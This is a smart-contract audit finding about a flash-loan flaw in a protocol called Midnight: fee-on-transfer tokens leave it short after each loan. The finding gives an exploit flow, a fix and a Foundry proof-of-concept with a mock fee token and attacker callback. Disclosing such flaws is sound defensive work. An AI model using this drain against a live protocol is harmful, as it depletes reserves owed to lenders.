### Title
Flash loan with fee-on-transfer token silently drains Midnight's reserves - (`src/Midnight.sol` / `src/libraries/SafeTransferLib.sol`)

### Summary
`flashLoan` transfers `assets` out via `safeTransfer`, then pulls back exactly `assets` via `safeTransferFrom`. Neither call verifies the net balance change. When the token charges a transfer fee `f`, Midnight receives only `assets*(1-f)` on the return leg, permanently losing `f*assets` per call. No existing check catches this shortfall.

### Finding Description
**Exact code path** — `src/Midnight.sol` lines 742-751:

```solidity
for (uint256 i = 0; i < tokens.length; i++) {
    SafeTransferLib.safeTransfer(tokens[i], callback, assets[i]);   // L743
}
require(
    IFlashLoanCallback(callback).onFlashLoan(...) == CALLBACK_SUCCESS, ...
);
for (uint256 i = 0; i < tokens.length; i++) {
    SafeTransferLib.safeTransferFrom(tokens[i], callback, address(this), assets[i]); // L750
}
```

`SafeTransferLib.safeTransfer` and `safeTransferFrom` (lines 12-34 of `src/libraries/SafeTransferLib.sol`) only verify the boolean return value of the ERC20 call. They do not snapshot or compare Midnight's balance before and after.

**Attacker inputs and exploit flow:**

1. Attacker deploys a callback contract and pre-funds it with `assets * f` units of a fee-on-transfer token (e.g., a token that deducts `f` from every transfer's received amount).
2. Attacker calls `flashLoan([feeToken], [assets], callback, data)`.
3. L743: `safeTransfer(feeToken, callback, assets)` — Midnight's balance decreases by `assets`; callback receives `assets*(1-f)`. Combined with the pre-funded `assets*f`, callback now holds exactly `assets`.
4. L746: `onFlashLoan` returns `CALLBACK_SUCCESS` — no state corruption needed.
5. L750: `safeTransferFrom(feeToken, callback, address(this), assets)` — callback's balance decreases by `assets`; Midnight receives only `assets*(1-f)` (fee deducted again on the inbound leg). The call returns `true`; `safeTransferFrom` does not revert.
6. Net: Midnight's balance is `X - assets*f` instead of `X`. The invariant is broken.

**Why existing checks fail:**

- `safeTransferFrom` checks only `returndata` truthiness, not the actual received amount. [1](#0-0) 
- There is no pre/post balance snapshot anywhere in `flashLoan`. [2](#0-1) 
- The Certora `tokenBalanceCorrect` invariant explicitly models tokens as fee-free (`CVL_transferFrom` moves value 1:1), so the formal verification does not cover this case. [3](#0-2) 
- The existing test suite (`test/FlashloanTest.sol`) uses standard mock ERC20s with no fee, so the test at line 47 (`assertEq(balanceOf(midnight), amounts[i])`) would pass but does not exercise fee-on-transfer tokens. [4](#0-3) 

### Impact Explanation
Midnight's token balance for the flash-loaned token decreases by `f*assets` per call. Repeated calls drain the protocol's reserves of that token, eventually making it unable to cover lender withdrawals, collateral claims, or fee payouts denominated in that token — a direct solvency violation of the core invariant that contract balances must cover all obligations.

### Likelihood Explanation
**Preconditions:** (a) a fee-on-transfer token exists that Midnight holds (e.g., as a loan token in a market); (b) attacker pre-funds the callback with `assets*f` tokens. Both are reachable by an unprivileged user — no admin action required. The attack is repeatable at a 1:1 cost-to-damage ratio (attacker spends `f*assets`, Midnight loses `f*assets`), making it a viable griefing/drain vector especially when `f` is small and `assets` is large.

### Recommendation
Add a balance snapshot before the outbound transfers and assert the balance is restored after the inbound transfers:

```solidity
uint256[] memory balancesBefore = new uint256[](tokens.length);
for (uint256 i = 0; i < tokens.length; i++) {
    balancesBefore[i] = IERC20(tokens[i]).balanceOf(address(this));
    SafeTransferLib.safeTransfer(tokens[i], callback, assets[i]);
}
require(IFlashLoanCallback(callback).onFlashLoan(...) == CALLBACK_SUCCESS, ...);
for (uint256 i = 0; i < tokens.length; i++) {
    SafeTransferLib.safeTransferFrom(tokens[i], callback, address(this), assets[i]);
    require(IERC20(tokens[i]).balanceOf(address(this)) >= balancesBefore[i], BalanceDecreased());
}
```

Alternatively, explicitly document and enforce (via a token allowlist or market creation check) that fee-on-transfer tokens are unsupported.

### Proof of Concept
```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Midnight} from "src/Midnight.sol";
import {CALLBACK_SUCCESS} from "src/libraries/ConstantsLib.sol";
import {IFlashLoanCallback} from "src/interfaces/ICallbacks.sol";

// Fee-on-transfer token: charges 1% fee on every transfer (deducted from recipient)
contract FeeToken {
    mapping(address => uint256) public balanceOf;
    uint256 constant FEE_BPS = 100; // 1%
    function mint(address to, uint256 amt) external { balanceOf[to] += amt; }
    function transfer(address to, uint256 amt) external returns (bool) {
        uint256 fee = amt * FEE_BPS / 10000;
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt - fee;
        return true;
    }
    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 fee = amt * FEE_BPS / 10000;
        balanceOf[from] -= amt;
        balanceOf[to] += amt - fee;
        return true;
    }
    function approve(address, uint256) external returns (bool) { return true; }
}

contract AttackerCallback is IFlashLoanCallback {
    FeeToken token;
    constructor(FeeToken t) { token = t; }
    function onFlashLoan(address, address[] memory, uint256[] memory amounts, bytes memory)
        external returns (bytes32)
    {
        // Approve Midnight to pull back `amounts[0]`
        // (callback already holds assets*(1-f) + pre-funded assets*f = assets)
        return CALLBACK_SUCCESS;
    }
}

contract FeeOnTransferFlashLoanTest is Test {
    Midnight midnight;
    FeeToken token;
    AttackerCallback callback;

    function setUp() public {
        midnight = new Midnight(/* ... */);
        token = new FeeToken();
        callback = new AttackerCallback(token);
    }

    function testFeeOnTransferDrainsMidnight() public {
        uint256 assets = 1000e18;
        // Seed Midnight with tokens
        token.mint(address(midnight), assets);
        uint256 balBefore = token.balanceOf(address(midnight));

        // Pre-fund callback with assets*f = 10e18 (1%)
        uint256 fee = assets * 100 / 10000;
        token.mint(address(callback), fee);

        address[] memory tokens = new address[](1);
        tokens[0] = address(token);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = assets;

        midnight.flashLoan(tokens, amounts, address(callback), "");

        uint256 balAfter = token.balanceOf(address(midnight));
        // ASSERTION: balance decreased — invariant violated
        assertLt(balAfter, balBefore, "Midnight balance must be unchanged after flash loan");
        // Expected loss: f*assets = 10e18
        assertEq(balBefore - balAfter, fee, "Loss equals fee*assets");
    }
}
```

**Expected result:** `assertLt` passes (balance decreased), proving the invariant is broken. The `assertEq` confirms the loss equals `f*assets` per call.
